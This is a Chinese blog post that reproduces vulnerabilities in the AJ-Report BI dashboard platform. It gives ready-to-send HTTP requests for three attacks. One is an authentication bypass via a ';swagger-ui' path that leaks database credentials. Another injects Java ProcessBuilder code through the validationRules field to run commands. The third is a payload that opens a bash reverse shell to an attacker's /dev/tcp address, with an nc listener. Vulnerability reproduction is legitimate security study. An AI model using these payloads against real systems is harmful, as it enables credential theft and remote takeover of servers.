#  AJ-Report 可视化大屏漏洞复现   
 kali笔记   2024-12-30 01:14  
  
> AJ-Report是全开源的一个BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。多数据源支持，内置mysql、elasticsearch、kudu驱动，支持自定义数据集省去数据接口开发，目前已支持30+种大屏组件/图表，不会开发，照着设计稿也可以制作大屏。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Xb3L3wnAiathDCibqJuHk8nA9tviajuxdByhsYiap2GBXuUFmAkl1qajhzpZZK2iapEosibozLIGldcNnbUSkv52Xic3g/640?wx_fmt=gif&from=appmsg "")  
# 部署相关  
  
在之前的文字中写过，大家可以参考历史文章。  
- 《[AJ-Report 快速搭建可视化大屏  部署篇](https://mp.weixin.qq.com/s?__biz=MzkxMzIwNTY1OA==&mid=2247501930&idx=1&sn=8412f0d021263c687f54d5c0c54f6cf3&scene=21#wechat_redirect)  
》  
  
- 《[可视化大屏AJ-Report 自定义组件](https://mp.weixin.qq.com/s?__biz=MzkxMzIwNTY1OA==&mid=2247502006&idx=1&sn=e8c8d3438dfaa3376ec0a8a5b0debc2a&scene=21#wechat_redirect)  
》  
  
# 漏洞复现  
  
部署完成后，访问ip:9095出现登录界面，如图！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathDCibqJuHk8nA9tviajuxdByvCwDkG6E9ItLgkCrPA13G9lzls6jEhIJdlEzVKvjJydtR6a0fTaVHQ/640?wx_fmt=png&from=appmsg "")  
  
01  
  
SQL注入复现  
  
**漏洞成因：**  
  
在com.anji.plus.gaea.curd.controller.GaeaBaseController#pageList中，直接查询dataSource的信息，并将Dto信息直接返回，这可能导致信息泄露。  
  
Dto中存在Collections集合，直接将配置信息返回，可能导致敏感信息（如数据库账号密码）泄露。通过构造特定的GET请求，可以利用此漏洞获取数据库账号密码。  
  
**复现：**  
  
我们先利用BURP抓包登录界面。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathDCibqJuHk8nA9tviajuxdByltUPr405cnfkLRicB7nK1ttXyoickCanXicCFtZzx3osFE5kic6XpBXLDQ/640?wx_fmt=png&from=appmsg "")  
  
修改数据包格式如下：  
```
GET /;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Accept-Encoding: gzip

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathDCibqJuHk8nA9tviajuxdByUvV2mKj9l9X0h21fHDPWawCywx5SbI4ibt29mcILGb65uenTib77A0Qw/640?wx_fmt=png&from=appmsg "")  
  
或者直接访问urlhttp://ip:9050/;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathDCibqJuHk8nA9tviajuxdByGhYQcjjS0p6LxZoRX5jKXyyn0UzlCTkcqbaQX7svcboU2JcvoYSmgQ/640?wx_fmt=png&from=appmsg "")  
  
02  
  
命令执行  
构造POC如下```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: 192.168.123.12:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 349
{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ip\",\"a\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathDCibqJuHk8nA9tviajuxdBypLeHTB2obFkkyJPxDZibibnQ2p9ZCTdqoKhic33qmPYjSVC6vmyzjdEvw/640?wx_fmt=png&from=appmsg "")  
  
得到了网卡信息  
  
03  
  
反弹Shell  
利用上述漏洞原理，我们可以反弹Shell  
注意：需要在同一局域网，不在同一网段，请做端口映射。在kali中执行命令  
```
nc -lvnp 7777

```  
  
**POC**  
```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 406

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/你的kaliIP/7777 0>&1\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}

```  
  
  
**更多精彩文章 欢迎关注我们**  
  
  
